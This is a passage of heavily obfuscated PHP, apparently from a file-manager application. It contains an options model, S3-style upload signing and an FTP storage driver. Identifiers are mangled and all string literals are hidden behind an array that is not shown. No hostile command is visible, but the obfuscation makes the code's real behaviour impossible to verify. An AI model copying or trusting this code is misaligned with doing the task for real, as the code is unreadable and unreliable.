$»©­ŠúÚ =& $_SERVER[³Ôà×Ó]; Model($this->modelType)->remove($»©­ŠúÚ[482], $this->optionType . $»©­ŠúÚ[483]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($íË–ıòï, $™ÉÃêßÏ) { if (!$™ÉÃêßÏ) { return !1; } $¿¢¾ Ó = $this->listData(); $¿¢¾ Ó = array_to_keyvalue($¿¢¾ Ó, $íË–ıòï); return isset($¿¢¾ Ó[$™ÉÃêßÏ]) ? $¿¢¾ Ó[$™ÉÃêßÏ] : !1; } public function findByName($äà†¿ª) { return $this->findByKey($_SERVER[³Ôà×Ó][32], $äà†¿ª); } protected function resetData($¹»ßşñ) { $½à­ÊÎä =& $_SERVER[³Ôà×Ó]; $¹»ßşñ = is_array($¹»ßşñ) ? $¹»ßşñ : array(); $€Ë‡ŞÄ = array(); for ($ñ‡­Ñï = 0; $ñ‡­Ñï < count($¹»ßşñ); $ñ‡­Ñï++) { $€Ë‡ŞÄ[$½à­ÊÎä[481] . $¹»ßşñ[$ñ‡­Ñï][$½à­ÊÎä[484]]] = $¹»ßşñ[$ñ‡­Ñï]; } return Model($this->modelType)->set($€Ë‡ŞÄ, !1, $this->optionType); } private function getAutoName($¯è©Æ…) { $˜ŸÎ§öå = array_to_keyvalue($this->listData(), $_SERVER[³Ôà×Ó][32]); if (!$˜ŸÎ§öå || !isset($˜ŸÎ§öå[$¯è©Æ…])) { return $¯è©Æ…; } for ($®‚Èİ¬ = 1; $®‚Èİ¬ < count($˜ŸÎ§öå); $®‚Èİ¬++) { $´ˆ›É™ü = $¯è©Æ… . "\50{$®‚Èİ¬}\51"; if (!isset($˜ŸÎ§öå[$´ˆ›É™ü])) { return $´ˆ›É™ü; } } return $´ˆ›É™ü; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ŒÇ‡ĞèÜ = false, $Ü™¦©¾ã = '', $»Á¤ˆ»¿ = false) { $ôº‚šÏº =& $_SERVER[³Ôà×Ó]; $¼óæ¸Î‡ = $this->cacheGet($Ü™¦©¾ã); $ûİÍ°™¾ = $this->optionDefault($Ü™¦©¾ã); $ûİÍ°™¾ = is_array($ûİÍ°™¾) ? $ûİÍ°™¾ : array(); if (is_array($¼óæ¸Î‡)) { $¼óæ¸Î‡ = array_merge($ûİÍ°™¾, $¼óæ¸Î‡); return $ŒÇ‡ĞèÜ ? isset($¼óæ¸Î‡[$ŒÇ‡ĞèÜ]) ? $¼óæ¸Î‡[$ŒÇ‡ĞèÜ] : null : $¼óæ¸Î‡; } $œ’­ÄÖä = $this->filterWhere(array($ôº‚šÏº[33] => $Ü™¦©¾ã)); $¼óæ¸Î‡ = $this->where($œ’­ÄÖä)->select(); $¼óæ¸Î‡ = array_to_keyvalue($¼óæ¸Î‡, $ôº‚šÏº[97], $ôº‚šÏº[459]); foreach ($¼óæ¸Î‡ as $˜ÙØÅÉ  => $“î¦ğˆÁ) { if ($»Á¤ˆ»¿ || in_array($˜ÙØÅÉ , $this->jsonField)) { $¼óæ¸Î‡[$˜ÙØÅÉ ] = json_decode($“î¦ğˆÁ, !0); } } $this->cacheSet($Ü™¦©¾ã, $¼óæ¸Î‡); $¼óæ¸Î‡ = array_merge($ûİÍ°™¾, $¼óæ¸Î‡); return $ŒÇ‡ĞèÜ ? $¼óæ¸Î‡[$ŒÇ‡ĞèÜ] : $¼óæ¸Î‡; } public function set($ïÔó·‘¿, $ë–şĞÂÆ = false, $ÔÖÔıúó = '') { $šñã˜…Ô =& $_SERVER[³Ôà×Ó]; $this->cacheRemove($ÔÖÔıúó); $’Õ®éé… = array(); $ÂûÛ–¢ = is_array($ïÔó·‘¿) ? $ïÔó·‘¿ : array($ïÔó·‘¿ => $ë–şĞÂÆ); foreach ($ÂûÛ–¢ as $’–Ê‡Åî => $»”Ì¬Ë») { if (is_array($»”Ì¬Ë»)) { $»”Ì¬Ë» = json_encode_force($»”Ì¬Ë»); } $this->checkLength($»”Ì¬Ë», !1, $this->tableName . $šñã˜…Ô[4] . $ïÔó·‘¿); $»”Ì¬Ë» = self::textEncode($»”Ì¬Ë»); $ÂûÛ–¢ = array($šñã˜…Ô[33] => $ÔÖÔıúó, $šñã˜…Ô[97] => $’–Ê‡Åî, $šñã˜…Ô[459] => $»”Ì¬Ë»); $’Õ®éé…[] = $this->filterWhere($ÂûÛ–¢); } if (!$’Õ®éé…) { return !0; } $®ıÛÔäÏ = $this->cacheKey($šñã˜…Ô[485]); CacheLock::lock($®ıÛÔäÏ); $“±ÜíÇ© = $this->addAll($’Õ®éé…, array(), !0); CacheLock::unlock($®ıÛÔäÏ); return $“±ÜíÇ©; } protected function optionDefault($ï®¡Şè† = '') { return !1; } public function setDeep($¡£ä»·, $ÚÌ·ùˆä = false, $Ü¨˜«ò = '') { $Ê˜»œ““ = explode($_SERVER[³Ôà×Ó][10], $¡£ä»·); $İøŸÊ›® = $this->get(); array_set_value($İøŸÊ›®, $¡£ä»·, $ÚÌ·ùˆä); $this->set($Ê˜»œ““[0], $İøŸÊ›®[$Ê˜»œ““[0]], $Ü¨˜«ò); } public function remove($ğ‹Ò–¦†, $÷£üÂ¡Ú = '') { $¾öˆĞŠ =& $_SERVER[³Ôà×Ó]; $this->cacheRemove($÷£üÂ¡Ú); $ö á³Ü = $this->filterWhere(array($¾öˆĞŠ[97] => $ğ‹Ò–¦†, $¾öˆĞŠ[33] => $÷£üÂ¡Ú)); if (is_null($ğ‹Ò–¦†)) { unset($ö á³Ü[$¾öˆĞŠ[97]]); } return $this->where($ö á³Ü)->delete(); } public function cacheSet($äì¶ã², $¶ÛŒÎà­ = false) { return Cache::set($this->cacheKey($äì¶ã²), $¶ÛŒÎà­); } public function cacheGet($ŸÇÂÊø¬) { return Cache::get($this->cacheKey($ŸÇÂÊø¬)); } public function cacheRemove($å§Òåõ¬) { return Cache::remove($this->cacheKey($å§Òåõ¬)); } protected function filterWhere($ŒÊË²×©) { return $ŒÊË²×©; } protected function cacheKey($¼§ìıÁù) { return $¼§ìıÁù; } } goto Eµ¾Ÿ‘² ¤; d‘÷Ë½²âº: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($‡úıÍÊª) { parent::__construct($‡úıÍÊª); $this->setSignVersion($_SERVER[³Ôà×Ó][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($´¼ÜÍçÏ) { parent::__construct($´¼ÜÍçÏ); $this->setSignVersion($_SERVER[³Ôà×Ó][247]); } public function uploadFormData($Ä„Ô¢Öù, $ŠÃı”É = 3600) { $ŞÅµ’ï =& $_SERVER[³Ôà×Ó]; $À˜»šÛÀ = $ŞÅµ’ï[229]; $ä®Ş½å£ = $ŞÅµ’ï[270]; $’úéŞ‰ = $ŞÅµ’ï[62]; $Âô¦Î–ù = gmdate($ŞÅµ’ï[271]); $Àâ…üœ = gmdate($ŞÅµ’ï[272]); $ãú¾Ç© = $ŞÅµ’ï[273]; $Ó†ğêÜ = $ŠÃı”É . $ŞÅµ’ï[12]; $ˆ³•âöÒ = $ŞÅµ’ï[274]; $Î±ŠÇíø = array($this->accessKey, $Àâ…üœ, $this->region, $’úéŞ‰, $ãú¾Ç©); $¡»Â¸Òå = implode($ŞÅµ’ï[8], $Î±ŠÇíø); $ó¼µŸí = array($ŞÅµ’ï[275] => gmdate($ŞÅµ’ï[299], strtotime($ŞÅµ’ï[277])), $ŞÅµ’ï[278] => array(array($ŞÅµ’ï[279] => $this->bucket), array($ŞÅµ’ï[280] => $À˜»šÛÀ), array($ŞÅµ’ï[281], $ŞÅµ’ï[282], $ŞÅµ’ï[12]), array($ŞÅµ’ï[281], $ŞÅµ’ï[283], $ŞÅµ’ï[12]), array($ŞÅµ’ï[281], $ŞÅµ’ï[284], $ŞÅµ’ï[12]), array($ŞÅµ’ï[285] => $ˆ³•âöÒ), array($ŞÅµ’ï[286] => $¡»Â¸Òå), array($ŞÅµ’ï[287] => $ä®Ş½å£), array($ŞÅµ’ï[288] => $Âô¦Î–ù), array($ŞÅµ’ï[289] => $Ó†ğêÜ))); $­ÆÍ›Ìó = base64_encode(json_encode($ó¼µŸí)); $ë·À­àë = hash_hmac($ŞÅµ’ï[290], $Àâ…üœ, $ŞÅµ’ï[291] . $this->secret, !0); $ñİöÅ“ò = hash_hmac($ŞÅµ’ï[290], $this->region, $ë·À­àë, !0); $Ò³–Ô‚â = hash_hmac($ŞÅµ’ï[290], $’úéŞ‰, $ñİöÅ“ò, !0); $ªóÙ›ª = hash_hmac($ŞÅµ’ï[290], $ãú¾Ç©, $Ò³–Ô‚â, !0); $™ùÖÉ¼ = hash_hmac($ŞÅµ’ï[290], $­ÆÍ›Ìó, $ªóÙ›ª); $È§ğà®ç = array($ŞÅµ’ï[246] => $ŞÅµ’ï[12], $ŞÅµ’ï[292] => $ŞÅµ’ï[12], $ŞÅµ’ï[280] => $À˜»šÛÀ, $ŞÅµ’ï[285] => $ˆ³•âöÒ, $ŞÅµ’ï[293] => $­ÆÍ›Ìó, $ŞÅµ’ï[294] => $¡»Â¸Òå, $ŞÅµ’ï[295] => $ä®Ş½å£, $ŞÅµ’ï[296] => $Âô¦Î–ù, $ŞÅµ’ï[297] => $Ó†ğêÜ, $ŞÅµ’ï[298] => $™ùÖÉ¼, $ŞÅµ’ï[208] => $this->getHost()); return $È§ğà®ç; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($®ÜêÏÏ¼) { parent::__construct(); if (count($®ÜêÏÏ¼) > 0) { $this->_init($®ÜêÏÏ¼); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¬¹¯öªá) { $§ÙæÚÖ“ =& $_SERVER[³Ôà×Ó]; global $config; $this->appCharset = $config[$§ÙæÚÖ“[1432]]; $this->systemCharset = $config[$§ÙæÚÖ“[1433]]; if (isset($¬¹¯öªá[$§ÙæÚÖ“[1434]]) && $¬¹¯öªá[$§ÙæÚÖ“[1434]]) { $this->systemCharset = $¬¹¯öªá[$§ÙæÚÖ“[1434]]; } } public function iconvApp($ö¨Ò«Æ©) { return $this->iconvTo($ö¨Ò«Æ©, $this->systemCharset, $this->appCharset); } public function iconvSystem($ı‹Ï¨á) { return $this->iconvTo($ı‹Ï¨á, $this->appCharset, $this->systemCharset); } public function getPathOuter($úÓæ¼Ûç) { $šğ—³’ =& $_SERVER[³Ôà×Ó]; $¯ü½Ø¬ß = $this->iconvApp($this->pathBase); $úÓæ¼Ûç = $this->iconvApp($úÓæ¼Ûç); if (substr($¯ü½Ø¬ß, 0, 2) == $šğ—³’[1435]) { $¯ü½Ø¬ß = BASIC_PATH . substr($¯ü½Ø¬ß, 2); } if (substr($úÓæ¼Ûç, 0, 2) == $šğ—³’[1435]) { $úÓæ¼Ûç = BASIC_PATH . substr($úÓæ¼Ûç, 2); } $¯ü½Ø¬ß = KodIO::clear($¯ü½Ø¬ß); $úÓæ¼Ûç = KodIO::clear($úÓæ¼Ûç); $úÓæ¼Ûç = substr($úÓæ¼Ûç, strlen($¯ü½Ø¬ß)); if (empty($this->pathDriver)) { return $úÓæ¼Ûç; } return $this->pathDriver . $šğ—³’[8] . ltrim($úÓæ¼Ûç, $šğ—³’[8]); } private function _init($í‰¬€ø = array()) { $¸¯Şİ› =& $_SERVER[³Ôà×Ó]; if (!function_exists($¸¯Şİ›[1436])) { throw new Exception(LNG($¸¯Şİ›[1437])); } $this->config = $í‰¬€ø; $this->charsetReset($í‰¬€ø); foreach ($í‰¬€ø as $ëøîÔò© => $¨ ¸¹Öø) { if (isset($this->{$ëøîÔò©})) { $this->{$ëøîÔò©} = $¨ ¸¹Öø; } } return $this->_login($í‰¬€ø); } private function _login($¤ĞàÅ‹) { $¯§†–•¼ =& $_SERVER[³Ôà×Ó]; static $½™˜©´ = array(); $ó´÷ÆîÈ = md5(json_encode($¤ĞàÅ‹)); if (isset($½™˜©´[$ó´÷ÆîÈ])) { foreach ($½™˜©´[$ó´÷ÆîÈ] as $Ü‰À’ıö => $¢ˆ¨—î) { $this->{$Ü‰À’ıö} = $¢ˆ¨—î; } return !0; } $”€çò¼× = parse_url(trim($this->server, $¯§†–•¼[8])); $this->host = $”€çò¼×[$¯§†–•¼[208]]; $ëÆÊÃè¼ = isset($”€çò¼×[$¯§†–•¼[207]]) && $”€çò¼×[$¯§†–•¼[207]] == $¯§†–•¼[1438] ? !0 : !1; $this->scheme = $ëÆÊÃè¼ ? $¯§†–•¼[1439] : $¯§†–•¼[1440]; $this->port = isset($”€çò¼×[$¯§†–•¼[209]]) ? $”€çò¼×[$¯§†–•¼[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($¯§†–•¼[1441]) . $this->host . $¯§†–•¼[4] . $this->port, !0); return !1; } $Ç™ô›— = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Ç™ô›—) { $this->writeLog(LNG($¯§†–•¼[1442]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $İó—ÉÍö = $this->pasv == $¯§†–•¼[91] ? !0 : !1; @ftp_pasv($this->connect, $İó—ÉÍö); $½™˜©´[$ó´÷ÆîÈ] = array($¯§†–•¼[1443] => $this->connect, $¯§†–•¼[208] => $this->host, $¯§†–•¼[207] => $this->scheme, $¯§†–•¼[209] => $this->port); return $Ç™ô›—; } private function _isconn($Áşß§üà = true) { if (is_resource($this->connect)) { return !0; } if (!$Áşß§üà) { return !1; } return $this->_login($this->config); } public function mkfile($‹œ¤À•¼, $ÙÁ§õÅ = '', $‰âåü²ş = REPEAT_RENAME) { if ($this->setContent($‹œ¤À•¼, $ÙÁ§õÅ)) { return $this->getPathOuter($‹œ¤À•¼); } $this->writeLog(LNG($_SERVER[³Ôà×Ó][1444]), !0); return !1; } public function mkdir($¿Îêüù§, $·ËùÇ¢‡ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¿Îêüù§ = $this->iconvSystem($¿Îêüù§); if ($this->_isFolder($¿Îêüù§) || @ftp_mkdir($this->connect, $¿Îêüù§)) { return $this->getPathOuter($¿Îêüù§); } if (!$this->mkdir($this->pathFather($¿Îêüù§))) { return !1; } if ($¿Îêüù§ = @ftp_mkdir($this->connect, $¿Îêüù§)) { return $this->getPathOuter($¿Îêüù§); } $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } public function copyFile($éğ…Üµ, $¼óÀŸ•·) { if (!$this->_isconn()) { return !1; } $˜ŸÆ×š = $this->pathThis($this->iconvSystem($éğ…Üµ)); $¿ï¬¢è = $this->tempFile($˜ŸÆ×š); $»²ğŞÄó = $this->iconvApp($¿ï¬¢è); $this->download($éğ…Üµ, $»²ğŞÄó); $îÈ„Õ°¬ = $this->upload($¼óÀŸ•·, $»²ğŞÄó); $this->tempFileRemve($¿ï¬¢è); return $îÈ„Õ°¬; } public function moveFile($Ú†éáœ, $”í”¾üö) { if (!$this->_isconn()) { return !1; } $Ú†éáœ = $this->iconvSystem($Ú†éáœ); $”í”¾üö = $this->iconvSystem($”í”¾üö); $’€«·ˆÕ = @ftp_rename($this->connect, $Ú†éáœ, $”í”¾üö); if (!$’€«·ˆÕ) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } return $this->getPathOuter($”í”¾üö); } public function delFile($îŞê) { if (!$this->_isconn()) { return !1; } $îŞê = $this->iconvSystem($îŞê); $…Š¨ïÖ = @ftp_delete($this->connect, $îŞê); if (!$…Š¨ïÖ) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); } return $…Š¨ïÖ; } public function delFolder($·úêÅ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ßôÛŠ = $åŠµ¶œ³ = array(); $this->fileList($·úêÅ, $ßôÛŠ, $åŠµ¶œ³, !0); $this->listItemCache = !0; foreach ($åŠµ¶œ³ as $¢Â•ÉÇ) { $“”œ¹÷” = $this->iconvSystem($¢Â•ÉÇ[$_SERVER[³Ôà×Ó][32]]); $ñç÷º = @ftp_delete($this->connect, $“”œ¹÷”); if (!$ñç÷º) { return !1; } } foreach ($ßôÛŠ as $“”œ¹÷”) { $“”œ¹÷” = $this->iconvSystem($“”œ¹÷”); $ñç÷º = @ftp_rmdir($this->connect, $“”œ¹÷”); if (!$ñç÷º) { return !1; } } $·úêÅ = $this->iconvSystem($·úêÅ); return @ftp_rmdir($this->connect, $·úêÅ); } public function rename($ÌìÑ×÷ø, $›‰ƒßöƒ) { $Ô®´Õ =& $_SERVER[³Ôà×Ó]; if (!$this->_isconn()) { return !1; } $Ù“Âœ¢ó = $this->fileNameAuto($this->pathFather($ÌìÑ×÷ø), $›‰ƒßöƒ); $Ù“Âœ¢ó = $this->iconvSystem($Ù“Âœ¢ó); $ÌìÑ×÷ø = $this->iconvSystem($ÌìÑ×÷ø); $ğìû«¨ş = $this->pathFather($ÌìÑ×÷ø); $éÑ¸Íœ = rtrim($ğìû«¨ş, $Ô®´Õ[8]) . $Ô®´Õ[8] . $Ù“Âœ¢ó; $ƒÒåáßŞ = @ftp_rename($this->connect, $ÌìÑ×÷ø, $éÑ¸Íœ); if (!$ƒÒåáßŞ) { $this->writeLog(__FUNCTION__ . $Ô®´Õ[1445], !0); return !1; } $éÑ¸Íœ = $this->iconvApp($éÑ¸Íœ); return $this->getPathOuter($éÑ¸Íœ); } private function folderInfo($¡Â§Ü¸Ê, $‘¹Û£„ö = false) { $üÍ¬Ï‚à =& $_SERVER[³Ôà×Ó]; $ª£ãôËë = array($üÍ¬Ï‚à[32] => $this->pathThis($¡Â§Ü¸Ê), $üÍ¬Ï‚à[87] => $this->getPathOuter($üÍ¬Ï‚à[8] . $¡Â§Ü¸Ê), $üÍ¬Ï‚à[33] => $üÍ¬Ï‚à[78]); if ($‘¹Û£„ö) { return $ª£ãôËë; } $ª£ãôËë[$üÍ¬Ï‚à[231]] = $ª£ãôËë[$üÍ¬Ï‚à[88]] = 0; $ª£ãôËë[$üÍ¬Ï‚à[232]] = $ª£ãôËë[$üÍ¬Ï‚à[233]] = !0; return $ª£ãôËë; } private function fileInfo($×™ÓÚµø, $óÌÒ¶› = false, $»îØ†¸¥ = array()) { $Ğë¸©ú¹ =& $_SERVER[³Ôà×Ó]; $ïöà„İ¸ = array($Ğë¸©ú¹[32] => $this->pathThis($×™ÓÚµø), $Ğë¸©ú¹[87] => $this->getPathOuter($Ğë¸©ú¹[8] . $×™ÓÚµø), $Ğë¸©ú¹[33] => $Ğë¸©ú¹[230], $Ğë¸©ú¹[79] => isset($»îØ†¸¥[$Ğë¸©ú¹[79]]) ? $»îØ†¸¥[$Ğë¸©ú¹[79]] : 0, $Ğë¸©ú¹[169] => $this->ext($×™ÓÚµø)); if ($óÌÒ¶›) { return $ïöà„İ¸; } $ïöà„İ¸[$Ğë¸©ú¹[231]] = $ïöà„İ¸[$Ğë¸©ú¹[88]] = 0; $ïöà„İ¸[$Ğë¸©ú¹[232]] = $ïöà„İ¸[$Ğë¸©ú¹[233]] = !0; $œ‰“Äæ = $this->iconvSystem($×™ÓÚµø); $ïöà„İ¸[$Ğë¸©ú¹[88]] = @ftp_mdtm($this->connect, $œ‰“Äæ); if (empty($»îØ†¸¥)) { $»îØ†¸¥ = $this->objectMeta($×™ÓÚµø); if (!$»îØ†¸¥) { return $ïöà„İ¸; } } $ïöà„İ¸[$Ğë¸©ú¹[79]] = $»îØ†¸¥[$Ğë¸©ú¹[79]]; return $ïöà„İ¸; } public function size($ë’Ò¶€›) { $òÓ¶Æù‘ = $this->objectMeta($ë’Ò¶€›); return $òÓ¶Æù‘ ? $òÓ¶Æù‘[$_SERVER[³Ôà×Ó][79]] : 0; } public function info($¿ÁÑæÕú) { if ($this->isFile($¿ÁÑæÕú)) { return $this->fileInfo($¿ÁÑæÕú, 0); } else { if ($this->isFolder($¿ÁÑæÕú)) { return $this->folderInfo($¿ÁÑæÕú); } } return !1; } private function fileList($ñÒ²Çë¥, &$’ª‹Ì‰õ, &$ãÆÚ•’×, $Äò€ê¾¼ = false) { $òâõœ… =& $_SERVER[³Ôà×Ó]; $ñÒ²Çë¥ = $this->iconvSystem($ñÒ²Çë¥); if (!$this->isFolder($ñÒ²Çë¥)) { return !1; } @ftp_chdir($this->connect, $òâõœ…[8]); $ñÒ²Çë¥ = rtrim($ñÒ²Çë¥, $òâõœ…[8]) . $òâõœ…[8]; check_abort(); $¨°«·ê¦ = @ftp_rawlist($this->connect, $ñÒ²Çë¥); if (!$¨°«·ê¦) { $¨°«·ê¦ = array(); } $ö¸»àã = array($òâõœ…[10] => 1, $òâõœ…[1360] => 1); foreach ($¨°«·ê¦ as $®Ö±äÖò) { $¤ÁƒÌí² = $this->_listItem($®Ö±äÖò); if ($¤ÁƒÌí²[0] == $òâõœ…[833]) { continue; } $ô±Öˆê = $¤ÁƒÌí²[8]; if (empty($ô±Öˆê) && $ô±Öˆê !== $òâõœ…[228] || isset($ö¸»àã[$ô±Öˆê])) { continue; } $ô±Öˆê = $this->iconvApp($ñÒ²Çë¥ . ltrim($ô±Öˆê, $òâõœ…[8])); $íÃêŞûµ = array($òâõœ…[32] => $ô±Öˆê, $òâõœ…[33] => $òâõœ…[230], $òâõœ…[79] => $¤ÁƒÌí²[4]); if (substr($®Ö±äÖò, 0, 1) == $òâõœ…[1446]) { $íÃêŞûµ[$òâõœ…[33]] = $òâõœ…[78]; $íÃêŞûµ[$òâõœ…[79]] = 0; } $Ûï—ÓÊ¨ = $íÃêŞûµ[$òâõœ…[33]] == $òâõœ…[78] ? !0 : !1; $this->cacheMethodInfoSet($ô±Öˆê, $Ûï—ÓÊ¨, $íÃêŞûµ); if ($Ûï—ÓÊ¨) { $’ª‹Ì‰õ[] = $ô±Öˆê; if ($Äò€ê¾¼) { $this->fileList($ô±Öˆê, $’ª‹Ì‰õ, $ãÆÚ•’×, $Äò€ê¾¼); } continue; } $ãÆÚ•’×[] = $íÃêŞûµ; } $this->cacheMethodInfoSet($ñÒ²Çë¥, !0); } private function _listItem($Ç¥½¦Ùó) { if (empty($Ç¥½¦Ùó)) { return array(); } $ªıúø¦… = preg_split($_SERVER[³Ôà×Ó][1447], $Ç¥½¦Ùó); if (count($ªıúø¦…) <= 9) { return $ªıúø¦…; } $ªıúø¦…[8] = trim(substr($Ç¥½¦Ùó, strpos($Ç¥½¦Ùó, $ªıúø¦…[7]) + strlen($ªıúø¦…[7]))); return array_splice($ªıúø¦…, 0, 9); } public function listPath($Û¼Ş®‡‰, $ıùû…Î = false) { $ËâøÁÆ =& $_SERVER[³Ôà×Ó]; if (!$this->_isconn()) { return !1; } $™³’é•ˆ = $˜åäŸº = array(); $this->fileList($Û¼Ş®‡‰, $™³’é•ˆ, $˜åäŸº); foreach ($™³’é•ˆ as $…³¥°±ˆ => $™£ôø) { $™³’é•ˆ[$…³¥°±ˆ] = $this->folderInfo($™£ôø, $ıùû…Î); } foreach ($˜åäŸº as $…³¥°±ˆ => $™£ôø) { $˜åäŸº[$…³¥°±ˆ] = $this->fileInfo($™£ôø[$ËâøÁÆ[32]], $ıùû…Î, $™£ôø); } return array($ËâøÁÆ[85] => $™³’é•ˆ, $ËâøÁÆ[86] => $˜åäŸº); } public function has($ÒÇÌˆ¸Ô, $êïÛ¯§‚ = false, $Ó³ÃĞé = true) { $©ÈõõÔÈ =& $_SERVER[³Ôà×Ó]; $¼æâœ³ì = $ûÄƒğ­Ä = array(); $µœŒª‚Ï = $êïÛ¯§‚ ? !0 : !1; $this->fileList($ÒÇÌˆ¸Ô, $¼æâœ³ì, $ûÄƒğ­Ä, $µœŒª‚Ï); if ($êïÛ¯§‚) { return array($©ÈõõÔÈ[239] => count($ûÄƒğ­Ä), $©ÈõõÔÈ[240] => count($¼æâœ³ì)); } if ($Ó³ÃĞé) { if (count($ûÄƒğ­Ä)) { return !0; } } else { if (count($¼æâœ³ì)) { return !0; } } return !1; } public function listAll($éŸ¡ä•) { $ß¸¹õµ¤ =& $_SERVER[³Ôà×Ó]; if (!$this->_isconn()) { return !1; } $ş»éäæ– = $£õŠÔÎ’ = array(); $this->fileList($éŸ¡ä•, $ş»éäæ–, $£õŠÔÎ’, !0); $»ï¬ä› = array_to_keyvalue($£õŠÔÎ’, $ß¸¹õµ¤[32]); foreach ($ş»éäæ– as $ îÅÍõÊ) { if (is_string($ îÅÍõÊ)) { $»ï¬ä›[$ îÅÍõÊ] = array($ß¸¹õµ¤[79] => 0); } } return $this->listAllFiles($éŸ¡ä•, $»ï¬ä›); } public function getContent($à¢„ÜÇ·) { if (!$this->_isconn()) { return !1; } $à¢„ÜÇ· = $this->iconvSystem($à¢„ÜÇ·); return $this->fileSubstr($à¢„ÜÇ·); } public function setContent($ÇêÕì»è, $”©ëÑÅ” = '') { if (!$this->_isconn()) { return !1; } $²Š¥ÁûÆ = $this->pathThis($this->iconvSystem($ÇêÕì»è)); $ì¢ÇôÒº = $this->tempFile($²Š¥ÁûÆ); file_put_contents($ì¢ÇôÒº, $”©ëÑÅ”); $øÖÌŒè’ = $this->upload($ÇêÕì»è, $this->iconvApp($ì¢ÇôÒº)); $this->tempFileRemve($ì¢ÇôÒº); return $øÖÌŒè’; } public function fileSubstr($Ğ°ÀÄ¸¯, $»—±ìÊ³ = 0, $õÑ„½³Ø = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Ğ°ÀÄ¸¯, $»—±ìÊ³, $õÑ„½³Ø); } private function ftpRequest($‚¯¥Æ†, $æÉáÙ¿ = 0, $íûî¡•» = false) { $‚¯¥Æ† = $this->iconvSystem($‚¯¥Æ†); $–éÌõª„ = $this->scheme . $this->host . $_SERVER[³Ôà×Ó][4] . $this->port; $Íà˜…şÄ = curl_init(); curl_setopt($Íà˜…şÄ, CURLOPT_URL, $–éÌõª„ . $this->pathEncode($‚¯¥Æ†)); curl_setopt($Íà˜…şÄ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($íûî¡•») { $­‰–©Á = $æÉáÙ¿ + $íûî¡•» - 1; curl_setopt($Íà˜…şÄ, CURLOPT_RANGE, "{$æÉáÙ¿}\x2d{$­‰–©Á}"); } curl_setopt($Íà˜…şÄ, CURLOPT_RETURNTRANSFER, 1); $¤“Ùı¢Ê = curl_exec($Íà˜…şÄ); curl_close($Íà˜…şÄ); return $¤“Ùı¢Ê; } public function upload($Í·èÓ–¾, $½—Æ´Ô, $ìèÑ®¹İ = false, $õĞéĞû = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Í·èÓ–¾))) { return !1; } $Í·èÓ–¾ = $this->iconvSystem($Í·èÓ–¾); $½—Æ´Ô = $this->iconvSystem($½—Æ´Ô); $ªèğ°öñ = ftp_nb_put($this->connect, $Í·èÓ–¾, $½—Æ´Ô, FTP_BINARY); while ($ªèğ°öñ == FTP_MOREDATA) { $ªèğ°öñ = ftp_nb_continue($this->connect); } if ($ªèğ°öñ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } return $this->getPathOuter($Í·èÓ–¾); } public function download($©ËÜĞ‡å, $·Öï·ß© = '') { if (!$this->_isconn()) { return !1; } $Ê–ŠÖ¡ê = $this->pathFather($·Öï·ß©); if (!IO::mkdir($Ê–ŠÖ¡ê)) { return !1; } $©ËÜĞ‡å = $this->iconvSystem($©ËÜĞ‡å); $·Öï·ß© = $this->iconvSystem($·Öï·ß©); $õÏŞú·  = ftp_nb_get($this->connect, $·Öï·ß©, $©ËÜĞ‡å, FTP_BINARY); while ($õÏŞú·  == FTP_MOREDATA) { $õÏŞú·  = ftp_nb_continue($this->connect); } if ($õÏŞú·  != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } return $this->iconvApp($·Öï·ß©); } public function exist($˜·‡Æá) { return $this->isFile($˜·‡Æá) || $this->isFolder($˜·‡Æá); } public function isFile($Ù©¾øÊ‰) { return !$this->isFolder($Ù©¾øÊ‰) && $this->objectMeta($Ù©¾øÊ‰); } public function isFolder($Ïø€åÕ²) { return $this->cacheMethod($_SERVER[³Ôà×Ó][179], $Ïø€åÕ²); } protected function objectMeta($øœğ±…ù) { return $this->cacheMethod($_SERVER[³Ôà×Ó][181], $øœğ±…ù); } protected function _objectMeta($”¼ı·„ƒ) { $ÎÑĞ»œù =& $_SERVER[³Ôà×Ó]; if ($”¼ı·„ƒ == $ÎÑĞ»œù[12] || $”¼ı·„ƒ == $ÎÑĞ»œù[8]) { return array(); } if (!$this->_isconn()) { return !1; } $”¼ı·„ƒ = $this->iconvSystem($”¼ı·„ƒ); $Ş®ƒòİÙ = array($ÎÑĞ»œù[32] => $this->iconvApp($”¼ı·„ƒ), $ÎÑĞ»œù[33] => $ÎÑĞ»œù[230], $ÎÑĞ»œù[79] => 0); @ftp_chdir($this->connect, $ÎÑĞ»œù[8]); $€Ï¼ë¦ = @ftp_size($this->connect, $”¼ı·„ƒ); if ($€Ï¼ë¦ != -1) { $Ş®ƒòİÙ[$ÎÑĞ»œù[79]] = $€Ï¼ë¦; } else { $Ê¾ÄøÒ = @ftp_chdir($this->connect, $”¼ı·„ƒ); if (!$Ê¾ÄøÒ) { return !1; } $Ş®ƒòİÙ[$ÎÑĞ»œù[33]] = $ÎÑĞ»œù[78]; } return $Ş®ƒòİÙ; } protected function _isFolder($×ª¿‡Ã) { $â´¼‚¤Å =& $_SERVER[³Ôà×Ó]; if 